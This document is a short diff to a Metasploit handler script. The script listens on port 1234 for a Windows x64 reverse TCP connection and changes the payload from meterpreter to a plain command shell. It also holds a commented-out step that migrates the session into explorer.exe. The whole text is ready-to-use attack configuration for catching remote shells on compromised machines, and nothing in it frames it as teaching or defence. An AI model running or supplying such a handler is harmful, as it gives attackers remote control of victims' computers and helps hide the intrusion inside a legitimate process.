@@ -1,5 +1,5 @@
 use exploit/multi/handler 
-set payload windows/x64/meterpreter/reverse_tcp
+set payload windows/x64/shell/reverse_tcp
 set lhost 0.0.0.0
 set lport 1234
 # set autorunscript migrate -n explorer.exe
